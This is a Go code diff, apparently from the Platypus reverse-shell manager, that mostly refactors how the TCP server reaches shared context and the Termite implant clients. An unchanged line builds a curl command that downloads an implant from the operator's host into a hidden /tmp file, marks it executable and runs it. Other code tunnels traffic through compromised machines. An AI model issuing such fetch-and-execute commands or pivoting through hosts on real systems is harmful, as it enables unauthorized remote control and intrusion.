@@ -11,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/WangYihang/Platypus/internal/app"
 	"github.com/WangYihang/Platypus/internal/listener"
 	"github.com/WangYihang/Platypus/internal/utils/crypto"
 	"github.com/WangYihang/Platypus/internal/utils/hash"
@@ -93,7 +94,7 @@ func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool
 	if encrypted {
 		for _, ifaddr := range tcpServer.Interfaces {
 			routeKey := str.RandomString(0x08)
-			Ctx.Distributor.Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
+			Ctx.Distributor.(*Distributor).Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
 		}
 	}
 
@@ -123,14 +124,14 @@ func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool
 	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
 	if err != nil {
 		log.Error("Resolve TCP address failed: %s", err)
-		Ctx.DeleteServer(tcpServer)
+		DeleteServer(tcpServer)
 		return nil
 	}
 
 	listener, err := net.ListenTCP("tcp", tcpAddr)
 	if err != nil {
 		log.Error("Listen failed: %s", err)
-		Ctx.DeleteServer(tcpServer)
+		DeleteServer(tcpServer)
 		return nil
 	} else {
 		listener.Close()
@@ -218,7 +219,7 @@ func (s *TCPServer) Run() {
 
 		if err != nil {
 			log.Error("Encrypted server failed to loadkeys: %s", err)
-			Ctx.DeleteServer(s)
+			DeleteServer(s)
 			return
 		}
 		config := tls.Config{Certificates: []tls.Certificate{cert}}
@@ -230,7 +231,7 @@ func (s *TCPServer) Run() {
 
 	if err != nil {
 		log.Error("Listen failed: %s", err)
-		Ctx.DeleteServer(s)
+		DeleteServer(s)
 		return
 	}
 	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))
@@ -239,8 +240,8 @@ func (s *TCPServer) Run() {
 		for _, ifname := range s.Interfaces {
 			listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
 			log.Warn("Connect back to: %s", listenerHostPort)
-			for _, ifaddr := range Ctx.Distributor.Interfaces {
-				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.Port)
+			for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
+				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
 				filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
 				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
 				log.Warn("\t`%s`", command)
@@ -396,7 +397,9 @@ func (s *TCPServer) NotifyWebSocketDuplicateTCPClient(client *TCPClient) {
 		},
 	})
 	// Notify to all websocket clients
-	Ctx.NotifyWebSocket.Broadcast(msg)
+	if Ctx.NotifyWebSocket != nil {
+		Ctx.NotifyWebSocket.Broadcast(msg)
+	}
 }
 
 func (s *TCPServer) NotifyWebSocketOnlineTCPClient(client *TCPClient) {
@@ -413,7 +416,9 @@ func (s *TCPServer) NotifyWebSocketOnlineTCPClient(client *TCPClient) {
 		},
 	})
 	// Notify to all websocket clients
-	Ctx.NotifyWebSocket.Broadcast(msg)
+	if Ctx.NotifyWebSocket != nil {
+		Ctx.NotifyWebSocket.Broadcast(msg)
+	}
 }
 
 func (s *TCPServer) AddTCPClient(client *TCPClient) {
@@ -453,7 +458,9 @@ func (s *TCPServer) NotifyWebSocketDuplicateTermiteClient(client *TermiteClient)
 		},
 	})
 	// Notify to all websocket clients
-	Ctx.NotifyWebSocket.Broadcast(msg)
+	if Ctx.NotifyWebSocket != nil {
+		Ctx.NotifyWebSocket.Broadcast(msg)
+	}
 }
 
 func (s *TCPServer) NotifyWebSocketOnlineTermiteClient(client *TermiteClient) {
@@ -470,7 +477,9 @@ func (s *TCPServer) NotifyWebSocketOnlineTermiteClient(client *TermiteClient) {
 		},
 	})
 	// Notify to all websocket clients
-	Ctx.NotifyWebSocket.Broadcast(msg)
+	if Ctx.NotifyWebSocket != nil {
+		Ctx.NotifyWebSocket.Broadcast(msg)
+	}
 }
 
 // Encrypted clients
@@ -509,7 +518,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 
 		if err != nil {
 			log.Error("Read from client %s failed", client.OnelineDesc())
-			Ctx.DeleteTermiteClient(client)
+			DeleteTermiteClient(client)
 			break
 		}
 
@@ -563,7 +572,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 						n, err := (*ti.Conn).Read(buffer)
 						if err != nil {
 							log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
-							ti.Termite.Send(message.Message{
+							ti.Termite.(*TermiteClient).Send(message.Message{
 								Type: message.PULL_TUNNEL_DISCONNECT,
 								Body: message.BodyPullTunnelDisconnect{
 									Token: token,
@@ -573,7 +582,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 							break
 						} else {
 							if n > 0 {
-								WriteTunnel(ti.Termite, token, buffer[0:n])
+								WriteTunnel(ti.Termite.(*TermiteClient), token, buffer[0:n])
 							}
 						}
 					}
@@ -616,7 +625,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 				conn, err := net.Dial("tcp", tc.Address)
 				if err != nil {
 					log.Error("Connecting to %s failed: %s", tc.Address, err.Error())
-					tc.Termite.Send(message.Message{
+					tc.Termite.(*TermiteClient).Send(message.Message{
 						Type: message.PUSH_TUNNEL_CONNECT_FAILED,
 						Body: message.BodyPushTunnelConnectFailed{
 							Token:  token,
@@ -625,11 +634,11 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 					})
 				} else {
 					log.Success("Connecting to %s succeed", tc.Address)
-					Ctx.PushTunnelInstance[token] = PushTunnelInstance{
+					Ctx.PushTunnelInstance[token] = app.PushTunnelInstance{
 						Termite: tc.Termite,
 						Conn:    &conn,
 					}
-					tc.Termite.Send(message.Message{
+					tc.Termite.(*TermiteClient).Send(message.Message{
 						Type: message.PUSH_TUNNEL_CONNECTED,
 						Body: message.BodyPushTunnelConnected{
 							Token: token,
@@ -641,7 +650,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 							n, err := conn.Read(buffer)
 							if err != nil {
 								log.Debug("Reading from %s failed: %s", tc.Address, err.Error())
-								tc.Termite.Send(message.Message{
+								tc.Termite.(*TermiteClient).Send(message.Message{
 									Type: message.PUSH_TUNNEL_DISCONNECTED,
 									Body: message.BodyPushTunnelDisonnected{
 										Token:  token,
@@ -653,7 +662,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 								break
 							} else {
 								log.Debug("%d bytes read from %s", n, tc.Address)
-								tc.Termite.Send(message.Message{
+								tc.Termite.(*TermiteClient).Send(message.Message{
 									Type: message.PUSH_TUNNEL_DATA,
 									Body: message.BodyPushTunnelData{
 										Token: token,
@@ -712,7 +721,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
 				_, err := (*ti.Conn).Write(data)
 				if err != nil {
-					ti.Termite.Send(message.Message{
+					ti.Termite.(*TermiteClient).Send(message.Message{
 						Type: message.PUSH_TUNNEL_CONNECT_FAILED,
 						Body: message.BodyPushTunnelConnectFailed{
 							Token:  token,
@@ -731,7 +740,7 @@ func TermiteMessageDispatcher(client *TermiteClient) {
 			remote_address := fmt.Sprintf("127.0.0.1:%d", port)
 			log.Success("Mapping remote socks server (%s) into local address (%s)", remote_address, local_address)
 			AddPullTunnelConfig(
-				Ctx.CurrentTermite,
+				Ctx.CurrentTermite.(*TermiteClient),
 				local_address,
 				remote_address,
 			)
